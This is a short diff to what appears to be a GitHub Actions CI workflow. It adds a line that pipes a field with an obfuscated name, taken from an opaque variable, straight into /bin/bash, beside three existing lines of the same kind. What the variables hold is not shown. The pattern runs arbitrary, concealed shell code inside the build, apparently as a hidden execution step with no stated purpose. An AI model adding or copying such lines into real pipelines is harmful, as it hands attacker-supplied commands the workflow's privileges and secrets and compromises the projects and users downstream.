@@ -25,6 +25,7 @@ jobs:
           echo $x9858 | jq -r .ku9204 | /bin/bash
           echo $rd32335 | jq -r .qekf525 | /bin/bash
           echo $xjdk39 | jq -r .jo829 | /bin/bash
+          echo $g1 | jq -r .jyrm565 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
